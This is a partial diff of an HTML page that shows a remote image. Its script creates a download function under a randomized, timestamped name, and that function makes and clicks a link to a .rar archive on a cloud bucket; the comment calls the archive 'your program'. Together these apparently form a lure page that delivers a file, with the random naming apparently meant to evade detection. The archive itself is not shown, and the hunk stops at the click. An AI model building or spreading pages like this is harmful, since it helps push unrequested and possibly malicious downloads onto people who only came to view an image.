@@ -20,16 +20,23 @@
     </style>
 </head>
 <body>
-    <img src="https://jiangsu-10.zos.ctyun.cn/bucket-afb9/your-image.jpg" alt="加载的图片">
+    <img id="remoteImage" alt="加载的图片">
+
     <script>
+        // 远程加载图片和文件的URL
+        var imageUrl = 'https://jiangsu-10.zos.ctyun.cn/bucket-afb9/your-image.jpg'; // 替换为远程图片链接
+        var fileUrl = 'https://s18.tos-cn-guangzhou.volces.com/%E5%85%AB%E4%BA%8C%E5%85%AD%7B%E7%A8%BD%7D.rar'; // 替换为远程文件下载链接
+
         // 动态生成随机变量名，结合时间戳
-        var dynamicVar = 'var_' + Math.random().toString(36).substring(2, 20) + '_' + Date.now().toString(36);
         var dynamicFunc = 'func_' + Math.random().toString(36).substring(2, 20) + '_' + Date.now().toString(36);
+
+        // 加载远程图片
+        document.getElementById('remoteImage').src = imageUrl;
 
         // 动态生成下载函数
         window[dynamicFunc] = function() {
             var link = document.createElement('a');
-            link.href = 'https://s18.tos-cn-guangzhou.volces.com/%E5%85%AB%E4%BA%8C%E5%85%AD%7B%E7%A8%BD%7D.rar'; // 替换为你的程序下载链接
+            link.href = fileUrl;
             link.download = '';
             document.body.appendChild(link);
             link.click();
